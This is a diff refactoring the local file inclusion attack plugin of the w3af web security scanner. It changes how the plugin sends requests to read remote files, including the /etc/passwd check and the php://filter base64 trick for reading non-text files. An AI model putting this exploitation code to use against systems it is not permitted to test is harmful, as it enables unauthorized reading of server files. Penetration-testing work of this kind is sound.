@@ -20,6 +20,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
 import base64
+import copy
 
 import w3af.core.controllers.output_manager as om
 
@@ -52,7 +53,7 @@ class local_file_reader(AttackPlugin):
         to exploit. For example, if the audit.os_commanding plugin finds a
         vuln, and saves it as:
 
-        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
+        kb.kb.append('os_commanding' , 'os_commanding', vuln)
 
         Then the exploit plugin that exploits os_commanding
         (attack.os_commanding) should return ['os_commanding',] in this method.
@@ -60,7 +61,7 @@ class local_file_reader(AttackPlugin):
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
-        return ['lfi',]
+        return ['lfi']
 
     def _generate_shell(self, vuln_obj):
         """
@@ -91,8 +92,7 @@ class local_file_reader(AttackPlugin):
             return True
         else:
             return self._guess_with_diff(vuln_obj)
-        
-    
+
     def _guess_with_diff(self, vuln_obj):
         """
         Try to define the cut with a relaxed algorithm based on two different
@@ -100,20 +100,15 @@ class local_file_reader(AttackPlugin):
         
         :return : True if vuln can be exploited and the information extracted
         """
-        function_reference = getattr(self._uri_opener, vuln_obj.get_method())
-        #    Prepare the first request, with the original data
-        data_a = str(vuln_obj.get_dc())
+        orig_mutant = vuln_obj.get_mutant()
 
-        #    Prepare the second request, with a non existent file
-        vulnerable_parameter = vuln_obj.get_var()
-        vulnerable_dc = vuln_obj.get_dc()
-        vulnerable_dc_copy = vulnerable_dc.copy()
-        vulnerable_dc_copy[vulnerable_parameter] = '/do/not/exist'
-        data_b = str(vulnerable_dc_copy)
+        # Prepare the second request, with a non existent file
+        copy_mutant = copy.deepcopy(orig_mutant)
+        copy_mutant.set_token_value('/do/not/exist')
 
         try:
-            response_a = function_reference(vuln_obj.get_url(), data_a)
-            response_b = function_reference(vuln_obj.get_url(), data_b)
+            response_a = self._uri_opener.send_mutant(orig_mutant)
+            response_b = self._uri_opener.send_mutant(copy_mutant)
         except BaseFrameworkException, e:
             om.out.error(str(e))
             return False
@@ -132,28 +127,27 @@ class local_file_reader(AttackPlugin):
         
         :return : True if vuln can be exploited and the information extracted
         """
-        function_reference = getattr(self._uri_opener, vuln_obj.get_method())
-        vuln_dc = vuln_obj.get_dc()
-        
         # Check if we can apply a stricter extraction method
-        if 'passwd' in vuln_obj.get_mutant().get_token_value():
-            try:
-                response_a = function_reference(vuln_obj.get_url(), str(vuln_dc),
-                                                cache=False)
-                response_b = function_reference(vuln_obj.get_url(), str(vuln_dc),
-                                                cache=False)
-            except BaseFrameworkException, e:
-                om.out.error(str(e))
-                return False
-            
-            try:
-                cut = self._define_cut_from_etc_passwd(response_a.get_body(),
-                                                       response_b.get_body())
-            except ValueError, ve:
-                om.out.error(str(ve))
-                return False
-            else:
-                return cut
+        if not 'passwd' in vuln_obj.get_mutant().get_token_value():
+            return False
+
+        mutant = vuln_obj.get_mutant()
+
+        try:
+            response_a = self._uri_opener.send_mutant(mutant)
+            response_b = self._uri_opener.send_mutant(mutant)
+        except BaseFrameworkException, e:
+            om.out.error(str(e))
+            return False
+
+        try:
+            cut = self._define_cut_from_etc_passwd(response_a.get_body(),
+                                                   response_b.get_body())
+        except ValueError, ve:
+            om.out.error(str(ve))
+            return False
+        else:
+            return cut
 
     def get_root_probability(self):
         """
@@ -222,8 +216,8 @@ class FileReaderShell(ReadShell):
             - Now, we handle that case and return an empty string.
 
         The second thing we do here is to test if the remote site allows us to
-        use "php://filter/convert.base64-encode/resource=" for reading files. This
-        is very helpful for reading non-text files.
+        use "php://filter/convert.base64-encode/resource=" for reading files.
+        This is very helpful for reading non-text files.
         """
         # Error handling
         app_error = self.read('not_exist0.txt')
@@ -282,21 +276,20 @@ class FileReaderShell(ReadShell):
 
     def _read_utils(self, filename):
         """
-        Actually perform the request to the remote server and returns the response
-        for parsing by the _read_with_b64 or _read_basic methods.
+        Actually perform the request to the remote server and returns the
+        response for parsing by the _read_with_b64 or _read_basic methods.
         """
-        function_reference = getattr(self._uri_opener, self.get_method())
-        data_container = self.get_dc().copy()
-        data_container[self.get_var()] = filename
+        mutant = copy.deepcopy(self.get_mutant())
+        mutant.set_token_value(filename)
+
         try:
-            response = function_reference(
-                self.get_url(), str(data_container))
+            response = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException, e:
             msg = 'Error "%s" while sending request to remote host. Try again.'
             return msg % e
         else:
-            cutted_response = self._cut(response.get_body())
-            filtered_response = self._filter_errors(cutted_response, filename)
+            cut_response = self._cut(response.get_body())
+            filtered_response = self._filter_errors(cut_response, filename)
 
             return filtered_response
 
